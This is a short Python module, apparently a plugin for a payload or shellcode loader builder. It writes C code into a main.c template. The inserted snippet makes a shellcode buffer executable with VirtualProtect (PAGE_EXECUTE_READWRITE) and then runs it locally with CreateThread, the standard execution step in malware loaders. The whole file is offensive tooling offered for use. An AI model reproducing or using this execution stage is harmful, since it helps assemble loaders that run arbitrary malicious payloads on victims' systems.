def desc():
    return "Use a local Create Thread to run the payload"

def run():
    execution = '''\
    // Making it executable
    DWORD dwOldProtection = NULL;
    VirtualProtect(pShellcode, sPayloadSize, PAGE_EXECUTE_READWRITE, &dwOldProtection);
    
    CreateThread(NULL, NULL, pShellcode, NULL, NULL, NULL) \
'''
    # Read the content of the input file
    with open("./src/main.c", 'r') as file:
        content = file.read()

    # Replace the template
    modified_content = content.replace("{{EXECUTION}}", execution)

    # Write the modified content to the output file
    with open("./src/main.c", 'w') as file:
        file.write(modified_content)
    
    return